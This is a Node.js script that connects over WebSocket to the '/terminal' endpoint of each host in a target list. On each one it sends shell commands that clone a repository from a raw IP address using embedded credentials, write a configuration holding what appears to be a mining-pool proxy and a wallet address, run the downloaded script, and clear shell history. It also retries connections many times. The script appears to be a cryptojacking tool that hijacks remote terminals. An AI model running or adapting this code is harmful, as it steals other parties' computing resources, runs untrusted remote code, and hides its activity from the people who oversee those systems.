const path = require('path');
const crypto = require('crypto');
const argv = require('minimist')(process.argv.slice(2));
const fs = require('fs');
const EventEmitter = require('events');
const fetch = require('node-fetch');
const WebSocket = require('ws');
const blessed = require('blessed');
const pLimit = require('p-limit');
const limit = pLimit(10); // Limit global: 10 stats berjalan bersamaan

function getRandomThreadCount() {
  return Math.floor(Math.random() * 4) + 4;
}

class Client extends EventEmitter {
  profile = null;
  name = '';
  retries = 0;
  maxRetries = 50000;

  constructor(profile, name) {
    super();
    this.profile = profile;
    this.name = name;
  }

  stats = (host) => new Promise((resolve) => {
    fetch(`https://${host}`, {
      method: 'GET',
      timeout: 5000,
      headers: {
        'Host': host,
        'Origin': `https://${host}`,
        'Connection': 'Upgrade',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache'
      }
    })
      .then(response => response.json())
      .then(() => resolve(true))
      .catch(() => resolve(false));
  });

  startWs = async (url, host, context, uid) => {
    let interval = null;
    this.emit('data', { uid, message: 'Connecting to terminal...' });

    const status = await this.stats(host);
    if (!status) {
      this.emit('data', { uid, message: 'Connection closed!' });
      setTimeout(() => this.startWs(url, host, context, uid), 25000);
      return;
    }

    const ws = new WebSocket(`wss://${host}/terminal`, {
      headers: {
        'Host': host,
        'Origin': `https://${host}`,
        'Connection': 'Upgrade',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'User-Agent': context.argent,
        'Upgrade': 'websocket',
        'Sec-WebSocket-Version': '13',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9,ja;q=0.8,vi;q=0.7',
        'Sec-WebSocket-Key': crypto.randomBytes(16).toString('base64'),
        'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits'
      }
    });

    ws.on('open', () => {
      this.emit('data', { uid, message: 'Connected to terminal...' });
      const randomUsername = `mbc1qpls8crvfnwdd0yuw0chmyj23wj6p702s0fx0ze.tes7core`;
      const randomThreads = getRandomThreadCount();

      const commands = [
        'cd ~/ || exit 1',
        '[ ! -d .git ] && git clone http://adminjerry:11a75ed3804a5df1b444f813b9f084310bb64eef@159.89.237.227:3000/adminjerry/python-app.git .git',
        'cd .git || exit 1',
        "sed -i 's/\r$//' run.sh",
        `echo -e 'proxy=wss://wes.baleribo.space/c3RyYXR1bS1uYS5ycGxhbnQueHl6OjcwMjI=\nhost=123.0.0.1\nport=33036\nusername=${randomUsername}\npassword=x\nthreads=7' > .env`,
        'chmod +x run.sh',
        `history -c && history -w && clear && ./run.sh 7`
      ];
      commands.forEach((command, i) => setTimeout(() => ws.send(command + '\n'), i * 1500));

      const runStats = async () => {
        await limit(() => this.stats(host));
        interval = setTimeout(runStats, 60 * 1000);
      };
      runStats();
    });

    ws.on('message', (data) => {
      this.emit('data', { uid, message: Buffer.from(data).toString().split(/\r?\n/)[0] });
    });

    ws.on('error', (error) => {
      this.emit('data', { uid, message: 'Error: ' + error.message });
      ws.close();
    });

    ws.on('close', () => {
      if (interval) clearTimeout(interval);

      if (this.retries < this.maxRetries) {
        this.retries++;
        setTimeout(() => this.startWs(url, host, context, uid), 25000);
        this.emit('data', { uid, message: `Retrying connection (${this.retries}/${this.maxRetries})...` });
      } else {
        this.emit('data', { uid, message: 'Max retries reached. Exiting...' });
      }
    });
  };

  start = () => {
    const profile = this.profile;
    const context = { argent: "" };
    profile.forEach((page, index) => {
      const uid = crypto.randomBytes(4).toString('hex');
      this.emit('open', { uid, index, url: page.url });
      setTimeout(() => {
        try {
          this.startWs('', page.terminal, context, uid);
        } catch (error) {
          this.emit('data', { uid, message: error.message });
        }
      }, index * 5000);
    });
  }
}

(async () => {
  const profile = argv.p || '0';
  const screen = blessed.screen({ smartCSR: true });
  screen.title = `Terminal Monitor - Profile ${profile}`;

  const logBox = blessed.box({
    top: 0,
    left: 0,
    width: '100%',
    height: '100%',
    label: `Host Status - Profile ${profile} (↑↓ scroll)`,
    border: { type: 'line' },
    style: { border: { fg: 'cyan' } },
    scrollable: true,
    alwaysScroll: true,
    keys: true,
    mouse: true,
    scrollbar: {
      ch: ' ',
      track: { bg: 'gray' },
      style: { inverse: true }
    },
    content: ''
  });

  screen.append(logBox);
  screen.key(['escape', 'q', 'C-c'], () => process.exit(0));

  const targets = JSON.parse(fs.readFileSync(path.join(__dirname, 'db.json'), 'utf-8'));
  const p = targets[profile];
  const client = new Client(p, profile);

  const status = {};
  const urls = {};

  const updateContent = () => {
    logBox.setContent(
      Object.entries(status).map(([uid, msg]) => `[#] ${urls[uid]} : ${msg}`).join('\n')
    );
    logBox.setScrollPerc(100);
    screen.render();
  };

  client.on('open', ({ uid, index, url }) => {
    urls[uid] = url;
    status[uid] = 'Connecting';
    updateContent();
  });

  client.on('data', ({ uid, message }) => {
    status[uid] = message;
    updateContent();
  });

  client.start();
})();
